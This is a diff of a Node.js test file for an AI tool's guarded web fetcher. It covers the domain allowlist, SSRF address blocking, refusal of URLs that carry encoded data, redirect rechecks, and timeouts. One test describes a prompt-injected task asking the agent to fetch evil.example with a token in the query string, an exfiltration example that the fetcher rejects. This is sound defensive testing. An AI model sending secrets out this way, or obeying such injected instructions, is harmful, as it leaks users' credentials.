@@ -3,6 +3,7 @@
 // resolver — the only real-network code path exercised refuses before it connects.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import { checkRows } from './helpers/rows.mjs';
 import { checkWebUrl, looksLikeData, isBlockedAddress, makeGuardedLookup, createWebFetcher, httpsTransport, WebAccessError, WEB_LIMITS } from '../src/core/ask/web-fetch.mjs';
 
 // A request that never answers until it is aborted. It holds a ref'd timer: the fetcher's deadline is
@@ -17,27 +18,30 @@ const hangUntilAbort = ({ signal }) => new Promise((_, rej) => {
 const ALLOW = ['docs.example.com', '*.mdn.io'];
 const res = (status, headers, body = '') => ({ status, headers, body: (async function* () { if (body) yield Buffer.from(body); })(), destroy() {} });
 
-test('checkWebUrl: allowlist, https, creds, port, IP literals', () => {
-  assert.equal(checkWebUrl('https://docs.example.com/a#frag', ALLOW).href, 'https://docs.example.com/a');
-  assert.throws(() => checkWebUrl('http://docs.example.com/', ALLOW), /only https/);
-  assert.throws(() => checkWebUrl('https://u:p@docs.example.com/', ALLOW), /credentials/);
-  assert.throws(() => checkWebUrl('https://docs.example.com:8443/', ALLOW), /port/);
-  assert.throws(() => checkWebUrl('https://127.0.0.1/', ALLOW), /IP-address/);
-  assert.throws(() => checkWebUrl('https://[::1]/', ALLOW), /IP-address/);
-  assert.throws(() => checkWebUrl('https://2130706433/', ALLOW), /IP-address/);
-  assert.throws(() => checkWebUrl('https://evil.example/', ALLOW), (e) => e instanceof WebAccessError && e.code === 'not-allowlisted' && /call propose_web_access/i.test(e.message));
-});
-
-test('checkWebUrl: data-carrying URLs are refused', () => {
-  assert.throws(() => checkWebUrl(`https://docs.example.com/?q=${'a'.repeat(257)}`, ALLOW), /query string longer than 256/);
-  assert.throws(() => checkWebUrl(`https://docs.example.com/${'a/'.repeat(300)}`, ALLOW), /path longer than 512/);
-  assert.throws(() => checkWebUrl(`https://docs.example.com/?d=${'QUJD'.repeat(16)}`, ALLOW), /encoded data/);
-  assert.throws(() => checkWebUrl(`https://docs.example.com/${'deadbeef01'.repeat(7)}`, ALLOW), /encoded data/);
-  checkWebUrl(`https://docs.example.com/${'a-long-lowercase-article-slug-'.repeat(3)}`, ALLOW);
-  checkWebUrl('https://docs.example.com/commit/0123456789abcdef0123456789abcdef01234567', ALLOW);
-  checkWebUrl('https://x.mdn.io/en-US/docs/Web/API/WebGL_API/Tutorial/Adding_2D_content_to_a_WebGL_context', ALLOW);
-  checkWebUrl('https://docs.example.com/wiki/List_of_Presidents_of_the_United_States_by_previous_experience_in_office', ALLOW);
-  assert.throws(() => checkWebUrl(`https://docs.example.com/x?d=${Buffer.from('A'.repeat(60)).toString('base64url')}`, ALLOW), /encoded data/);
+test('checkWebUrl: allowlist, https, creds, port, IP literals and data-carrying URLs are refused', async () => {
+  await checkRows([
+    { name: 'checkWebUrl: allowlist, https, creds, port, IP literals', run: () => {
+      assert.equal(checkWebUrl('https://docs.example.com/a#frag', ALLOW).href, 'https://docs.example.com/a');
+      assert.throws(() => checkWebUrl('http://docs.example.com/', ALLOW), /only https/);
+      assert.throws(() => checkWebUrl('https://u:p@docs.example.com/', ALLOW), /credentials/);
+      assert.throws(() => checkWebUrl('https://docs.example.com:8443/', ALLOW), /port/);
+      assert.throws(() => checkWebUrl('https://127.0.0.1/', ALLOW), /IP-address/);
+      assert.throws(() => checkWebUrl('https://[::1]/', ALLOW), /IP-address/);
+      assert.throws(() => checkWebUrl('https://2130706433/', ALLOW), /IP-address/);
+      assert.throws(() => checkWebUrl('https://evil.example/', ALLOW), (e) => e instanceof WebAccessError && e.code === 'not-allowlisted' && /call propose_web_access/i.test(e.message));
+    } },
+    { name: 'checkWebUrl: data-carrying URLs are refused', run: () => {
+      assert.throws(() => checkWebUrl(`https://docs.example.com/?q=${'a'.repeat(257)}`, ALLOW), /query string longer than 256/);
+      assert.throws(() => checkWebUrl(`https://docs.example.com/${'a/'.repeat(300)}`, ALLOW), /path longer than 512/);
+      assert.throws(() => checkWebUrl(`https://docs.example.com/?d=${'QUJD'.repeat(16)}`, ALLOW), /encoded data/);
+      assert.throws(() => checkWebUrl(`https://docs.example.com/${'deadbeef01'.repeat(7)}`, ALLOW), /encoded data/);
+      checkWebUrl(`https://docs.example.com/${'a-long-lowercase-article-slug-'.repeat(3)}`, ALLOW);
+      checkWebUrl('https://docs.example.com/commit/0123456789abcdef0123456789abcdef01234567', ALLOW);
+      checkWebUrl('https://x.mdn.io/en-US/docs/Web/API/WebGL_API/Tutorial/Adding_2D_content_to_a_WebGL_context', ALLOW);
+      checkWebUrl('https://docs.example.com/wiki/List_of_Presidents_of_the_United_States_by_previous_experience_in_office', ALLOW);
+      assert.throws(() => checkWebUrl(`https://docs.example.com/x?d=${Buffer.from('A'.repeat(60)).toString('base64url')}`, ALLOW), /encoded data/);
+    } },
+  ]);
 });
 
 test('looksLikeData: word-like runs pass, random data does not', () => {
@@ -52,26 +56,28 @@ test('injection: a diff/task asking to fetch https://evil.example/?d=<secret> is
   await assert.rejects(f.fetch('https://evil.example/?d=ghp_0123456789abcdefABCDEF0123456789abcd'), /not on the Ask web allowlist/);
 });
 
-test('isBlockedAddress covers loopback, private, link-local/metadata, ULA, mapped; NAT64 decodes', () => {
-  for (const a of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.100.100.200', '0.0.0.0', '::1', '::', 'fe80::1', 'fd00:ec2::254', '::ffff:127.0.0.1', '64:ff9b::7f00:1', 'ff02::1']) assert.equal(isBlockedAddress(a), true, a);
-  for (const a of ['::127.0.0.1', '64:ff9b:0:0:0:0:7f00:1', 'fe80::1%en0']) assert.equal(isBlockedAddress(a), true, a);
-  // regression: a '::ffff:0:0/96' IPv6 rule makes BlockList block every public IPv4 address
-  for (const a of ['93.184.216.34', '8.8.8.8', '::ffff:93.184.216.34', '2606:2800:220:1:248:1893:25c8:1946', '64:ff9b::5db8:d822']) assert.equal(isBlockedAddress(a), false, a);
-});
-
-test('guardedLookup refuses a hostname resolving to 127.0.0.1 (and mixed answers)', async () => {
-  const lookup = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '127.0.0.1', family: 4 }]));
-  const err = await new Promise((r) => lookup('docs.example.com', { all: true }, (e) => r(e)));
-  assert.equal(err.code, 'EWORCA_BLOCKED');
-  const mixed = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '93.184.216.34', family: 4 }, { address: '10.0.0.1', family: 4 }]));
-  assert.equal((await new Promise((r) => mixed('x', {}, (e) => r(e)))).code, 'EWORCA_BLOCKED');
-  const ok = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '93.184.216.34', family: 4 }]));
-  assert.deepEqual(await new Promise((r) => ok('x', {}, (e, a, f) => r([e, a, f]))), [null, '93.184.216.34', 4]);
-});
-
-test('real https transport uses the guarded lookup (no connection to 127.0.0.1)', async () => {
-  const lookup = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '127.0.0.1', family: 4 }]));
-  await assert.rejects(httpsTransport({ url: new URL('https://docs.example.com/'), lookup, headers: {}, signal: AbortSignal.timeout(5000) }), { code: 'EWORCA_BLOCKED' });
+test('SSRF: isBlockedAddress covers loopback/private/link-local/ULA/mapped (NAT64 decoded); guardedLookup refuses a host resolving there (mixed answers too); the real transport uses it', async () => {
+  await checkRows([
+    { name: 'isBlockedAddress covers loopback, private, link-local/metadata, ULA, mapped; NAT64 decodes', run: () => {
+      for (const a of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.100.100.200', '0.0.0.0', '::1', '::', 'fe80::1', 'fd00:ec2::254', '::ffff:127.0.0.1', '64:ff9b::7f00:1', 'ff02::1']) assert.equal(isBlockedAddress(a), true, a);
+      for (const a of ['::127.0.0.1', '64:ff9b:0:0:0:0:7f00:1', 'fe80::1%en0']) assert.equal(isBlockedAddress(a), true, a);
+      // regression: a '::ffff:0:0/96' IPv6 rule makes BlockList block every public IPv4 address
+      for (const a of ['93.184.216.34', '8.8.8.8', '::ffff:93.184.216.34', '2606:2800:220:1:248:1893:25c8:1946', '64:ff9b::5db8:d822']) assert.equal(isBlockedAddress(a), false, a);
+    } },
+    { name: 'guardedLookup refuses a hostname resolving to 127.0.0.1 (and mixed answers)', run: async () => {
+      const lookup = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '127.0.0.1', family: 4 }]));
+      const err = await new Promise((r) => lookup('docs.example.com', { all: true }, (e) => r(e)));
+      assert.equal(err.code, 'EWORCA_BLOCKED');
+      const mixed = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '93.184.216.34', family: 4 }, { address: '10.0.0.1', family: 4 }]));
+      assert.equal((await new Promise((r) => mixed('x', {}, (e) => r(e)))).code, 'EWORCA_BLOCKED');
+      const ok = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '93.184.216.34', family: 4 }]));
+      assert.deepEqual(await new Promise((r) => ok('x', {}, (e, a, f) => r([e, a, f]))), [null, '93.184.216.34', 4]);
+    } },
+    { name: 'real https transport uses the guarded lookup (no connection to 127.0.0.1)', run: async () => {
+      const lookup = makeGuardedLookup((h, o, cb) => cb(null, [{ address: '127.0.0.1', family: 4 }]));
+      await assert.rejects(httpsTransport({ url: new URL('https://docs.example.com/'), lookup, headers: {}, signal: AbortSignal.timeout(5000) }), { code: 'EWORCA_BLOCKED' });
+    } },
+  ]);
 });
 
 test('redirects are re-checked: non-allowlisted host, http, >3 hops', async () => {
@@ -85,37 +91,40 @@ test('redirects are re-checked: non-allowlisted host, http, >3 hops', async () =
   assert.equal(r.finalUrl, 'https://x.mdn.io/p'); assert.equal(r.text, 'hi'); assert.equal(calls, 2);
 });
 
-test('size cap truncates; timeout aborts; unsupported type and non-2xx error', async () => {
-  const big = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, maxBytes: 10 }, transport: async () => res(200, { 'content-type': 'text/plain' }, 'x'.repeat(50)) });
-  const r = await big.fetch('https://docs.example.com/');
-  assert.equal(r.text, 'x'.repeat(10)); assert.equal(r.truncated, true);
-  const slow = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, timeoutMs: 30 },
-    transport: hangUntilAbort });
-  await assert.rejects(slow.fetch('https://docs.example.com/'), /timed out after/);
-  await assert.rejects(createWebFetcher({ allowedDomains: ALLOW, transport: async () => res(200, { 'content-type': 'application/pdf' }) }).fetch('https://docs.example.com/'), /unsupported content type/);
-  await assert.rejects(createWebFetcher({ allowedDomains: ALLOW, transport: async () => res(404, { 'content-type': 'text/html' }) }).fetch('https://docs.example.com/'), /HTTP 404/);
-});
-
-test('an unreachable host says this worca may have no internet access; the log keeps the code', async () => {
-  const fail = (code) => async () => { throw Object.assign(new Error(`connect ${code}`), { code }); };
-  for (const code of ['ENOTFOUND', 'EAI_AGAIN', 'ECONNREFUSED', 'ETIMEDOUT', 'ENETUNREACH']) {
-    const entries = [];
-    const f = createWebFetcher({ allowedDomains: ALLOW, transport: fail(code), log: (e) => entries.push(e) });
-    await assert.rejects(f.fetch('https://docs.example.com/'), (e) => e.code === 'network'
-      && e.message.startsWith(`network error: ${code} — could not reach docs.example.com.`) && /may not have internet access/.test(e.message));
-    assert.match(entries[0].error, new RegExp(`^network error: ${code}`));
-  }
-  // Any other failure keeps the bare code.
-  await assert.rejects(createWebFetcher({ allowedDomains: ALLOW, transport: fail('ECONNRESET') }).fetch('https://docs.example.com/'),
-    (e) => e.message === 'network error: ECONNRESET');
-  // A timeout before the host answered hints too; one after it answered (a slow body) does not.
-  const hang = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, timeoutMs: 30 },
-    transport: hangUntilAbort });
-  await assert.rejects(hang.fetch('https://docs.example.com/'), /timed out after .* may not have internet access/);
-  const slowBody = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, timeoutMs: 30 },
-    transport: async ({ signal }) => ({ status: 200, headers: { 'content-type': 'text/plain' }, destroy() {},
-      body: (async function* () { await hangUntilAbort({ signal }); })() }) });
-  await assert.rejects(slowBody.fetch('https://docs.example.com/'), (e) => /^timed out after [\d.]+ s$/.test(e.message));
+test('transport failures: size cap truncates, timeout aborts, unsupported type and non-2xx error; an unreachable host says worca may have no internet (log keeps the code)', async () => {
+  await checkRows([
+    { name: 'size cap truncates; timeout aborts; unsupported type and non-2xx error', run: async () => {
+      const big = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, maxBytes: 10 }, transport: async () => res(200, { 'content-type': 'text/plain' }, 'x'.repeat(50)) });
+      const r = await big.fetch('https://docs.example.com/');
+      assert.equal(r.text, 'x'.repeat(10)); assert.equal(r.truncated, true);
+      const slow = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, timeoutMs: 30 },
+        transport: hangUntilAbort });
+      await assert.rejects(slow.fetch('https://docs.example.com/'), /timed out after/);
+      await assert.rejects(createWebFetcher({ allowedDomains: ALLOW, transport: async () => res(200, { 'content-type': 'application/pdf' }) }).fetch('https://docs.example.com/'), /unsupported content type/);
+      await assert.rejects(createWebFetcher({ allowedDomains: ALLOW, transport: async () => res(404, { 'content-type': 'text/html' }) }).fetch('https://docs.example.com/'), /HTTP 404/);
+    } },
+    { name: 'an unreachable host says this worca may have no internet access; the log keeps the code', run: async () => {
+      const fail = (code) => async () => { throw Object.assign(new Error(`connect ${code}`), { code }); };
+      for (const code of ['ENOTFOUND', 'EAI_AGAIN', 'ECONNREFUSED', 'ETIMEDOUT', 'ENETUNREACH']) {
+        const entries = [];
+        const f = createWebFetcher({ allowedDomains: ALLOW, transport: fail(code), log: (e) => entries.push(e) });
+        await assert.rejects(f.fetch('https://docs.example.com/'), (e) => e.code === 'network'
+          && e.message.startsWith(`network error: ${code} — could not reach docs.example.com.`) && /may not have internet access/.test(e.message));
+        assert.match(entries[0].error, new RegExp(`^network error: ${code}`));
+      }
+      // Any other failure keeps the bare code.
+      await assert.rejects(createWebFetcher({ allowedDomains: ALLOW, transport: fail('ECONNRESET') }).fetch('https://docs.example.com/'),
+        (e) => e.message === 'network error: ECONNRESET');
+      // A timeout before the host answered hints too; one after it answered (a slow body) does not.
+      const hang = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, timeoutMs: 30 },
+        transport: hangUntilAbort });
+      await assert.rejects(hang.fetch('https://docs.example.com/'), /timed out after .* may not have internet access/);
+      const slowBody = createWebFetcher({ allowedDomains: ALLOW, limits: { ...WEB_LIMITS, timeoutMs: 30 },
+        transport: async ({ signal }) => ({ status: 200, headers: { 'content-type': 'text/plain' }, destroy() {},
+          body: (async function* () { await hangUntilAbort({ signal }); })() }) });
+      await assert.rejects(slowBody.fetch('https://docs.example.com/'), (e) => /^timed out after [\d.]+ s$/.test(e.message));
+    } },
+  ]);
 });
 
 test('HTML is converted; every call is logged (refusals too)', async () => {
